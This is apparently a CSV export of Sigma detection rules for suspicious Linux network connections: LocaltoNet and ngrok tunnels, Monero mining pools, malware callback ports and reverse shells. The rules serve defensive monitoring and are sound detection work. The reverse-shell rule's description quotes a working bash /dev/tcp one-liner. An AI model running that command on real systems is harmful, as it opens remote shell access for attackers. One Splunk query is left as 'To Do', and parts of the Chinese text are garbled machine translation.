File Name,Rule Title,Rule ID,Rule Description,Chinese Title,Chinese Description,Level,References,Tags,Logsource,Fields,FalsePositive,Error Translation,Detection,SPL Query
net_connection_lnx_domain_localtonet_tunnel.yml,Communication To LocaltoNet Tunneling Service Initiated - Linux,c4568f5d-131f-4e78-83d4-45b2da0ec4f1,"Detects an executable initiating a network connection to ""LocaltoNet"" tunneling sub-domains.
LocaltoNet is a reverse proxy that enables localhost services to be exposed to the Internet.
Attackers have been seen to use this service for command-and-control activities to bypass MFA and perimeter controls.
",启动与Localtonet隧道服务的通信-Linux,"检测可执行的可执行组织，该可执行文件启动网络连接到“ localtonet”隧道子域。
Localtonet是一个反向代理，使Localhost服务能够接触到Internet。
已经看到攻击者将此服务用于命令和控制活动，以绕过MFA和外围控制。",high,"https://localtonet.com/documents/supported-tunnels, https://cloud.google.com/blog/topics/threat-intelligence/unc3944-targets-saas-applications","attack.command_and_control, attack.t1572, attack.t1090, attack.t1102","product: linux, service: None",,['Legitimate use of the LocaltoNet service.'],,"{'selection': {'DestinationHostname|endswith': ['.localto.net', '.localtonet.com'], 'Initiated': 'true'}, 'condition': 'selection'}","DestinationHostname IN (""*.localto.net"", ""*.localtonet.com"") Initiated=""true"""
net_connection_lnx_crypto_mining_indicators.yml,Linux Crypto Mining Pool Connections,a46c93b7-55ed-4d27-a41b-c259456c4746,Detects process connections to a Monero crypto mining pool,Linux加密挖掘池连接,检测到与Monero加密矿池的过程连接,high,https://www.poolwatch.io/coin/monero,"attack.impact, attack.t1496","product: linux, service: None",,['Legitimate use of crypto miners'],,"{'selection': {'DestinationHostname': ['pool.minexmr.com', 'fr.minexmr.com', 'de.minexmr.com', 'sg.minexmr.com', 'ca.minexmr.com', 'us-west.minexmr.com', 'pool.supportxmr.com', 'mine.c3pool.com', 'xmr-eu1.nanopool.org', 'xmr-eu2.nanopool.org', 'xmr-us-east1.nanopool.org', 'xmr-us-west1.nanopool.org', 'xmr-asia1.nanopool.org', 'xmr-jp1.nanopool.org', 'xmr-au1.nanopool.org', 'xmr.2miners.com', 'xmr.hashcity.org', 'xmr.f2pool.com', 'xmrpool.eu', 'pool.hashvault.pro', 'moneroocean.stream', 'monerocean.stream']}, 'condition': 'selection'}","DestinationHostname IN (""pool.minexmr.com"", ""fr.minexmr.com"", ""de.minexmr.com"", ""sg.minexmr.com"", ""ca.minexmr.com"", ""us-west.minexmr.com"", ""pool.supportxmr.com"", ""mine.c3pool.com"", ""xmr-eu1.nanopool.org"", ""xmr-eu2.nanopool.org"", ""xmr-us-east1.nanopool.org"", ""xmr-us-west1.nanopool.org"", ""xmr-asia1.nanopool.org"", ""xmr-jp1.nanopool.org"", ""xmr-au1.nanopool.org"", ""xmr.2miners.com"", ""xmr.hashcity.org"", ""xmr.f2pool.com"", ""xmrpool.eu"", ""pool.hashvault.pro"", ""moneroocean.stream"", ""monerocean.stream"")"
net_connection_lnx_susp_malware_callback_port.yml,Potentially Suspicious Malware Callback Communication - Linux,dbfc7c98-04ab-4ab7-aa94-c74d22aa7376,"Detects programs that connect to known malware callback ports based on threat intelligence reports.
",潜在的可疑恶意软件回调通信-Linux,检测基于威胁情报报告的已知恶意软件回调端口的程序。,high,"['https://www.mandiant.com/resources/blog/triton-actor-ttp-profile-custom-attack-tools-detections', 'https://www.mandiant.com/resources/blog/ukraine-and-sandworm-team', 'https://www.elastic.co/guide/en/security/current/potential-non-standard-port-ssh-connection.html', 'https://thehackernews.com/2024/01/systembc-malwares-c2-server-analysis.html', 'https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors']","['attack.persistence', 'attack.command_and_control', 'attack.t1571']","{'category': 'network_connection', 'product': 'linux'}",,['Unknown'],ORing CIDR matching is not yet supported by Splunk backend,"{'selection': {'Initiated': 'true', 'DestinationPort': [888, 999, 2200, 2222, 4000, 4444, 6789, 8531, 50501, 51820]}, 'filter_main_local_ranges': {'DestinationIp|cidr': ['127.0.0.0/8', '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '169.254.0.0/16', '::1/128', 'fe80::/10', 'fc00::/7']}, 'condition': 'selection and not 1 of filter_main_*'}",To Do
net_connection_lnx_back_connect_shell_dev.yml,Linux Reverse Shell Indicator,83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871,Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'),Linux反向外壳指示器,检测连接到远程IP地址的bash（通常在演员执行诸如'bash -i>＆/dev/tcp/10.0.0.0.1/4242 0>＆1'之类的事情时找到）,critical,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md,"attack.execution, attack.t1059.004","product: linux, service: None",,['Unknown'],,"{'selection': {'Image|endswith': '/bin/bash'}, 'filter': {'DestinationIp': ['127.0.0.1', '0.0.0.0']}, 'condition': 'selection and not filter'}","Image=""*/bin/bash"" NOT (DestinationIp IN (""127.0.0.1"", ""0.0.0.0""))"
net_connection_lnx_ngrok_tunnel.yml,Communication To Ngrok Tunneling Service - Linux,19bf6fdb-7721-4f3d-867f-53467f6a5db6,"Detects an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors",与NGrok隧道服务的通信-Linux,检测可执行的可执行文件，访问NGrok隧道端点，这可能是恶意参与者对数据剥落的禁止的迹象,high,"https://twitter.com/hakluke/status/1587733971814977537/photo/1, https://ngrok.com/docs/secure-tunnels/tunnels/ssh-reverse-tunnel-agent","attack.exfiltration, attack.command_and_control, attack.t1567, attack.t1568.002, attack.t1572, attack.t1090, attack.t1102, attack.s0508","product: linux, service: None",,['Legitimate use of ngrok'],,"{'selection': {'DestinationHostname|contains': ['tunnel.us.ngrok.com', 'tunnel.eu.ngrok.com', 'tunnel.ap.ngrok.com', 'tunnel.au.ngrok.com', 'tunnel.sa.ngrok.com', 'tunnel.jp.ngrok.com', 'tunnel.in.ngrok.com']}, 'condition': 'selection'}","DestinationHostname IN (""*tunnel.us.ngrok.com*"", ""*tunnel.eu.ngrok.com*"", ""*tunnel.ap.ngrok.com*"", ""*tunnel.au.ngrok.com*"", ""*tunnel.sa.ngrok.com*"", ""*tunnel.jp.ngrok.com*"", ""*tunnel.in.ngrok.com*"")"
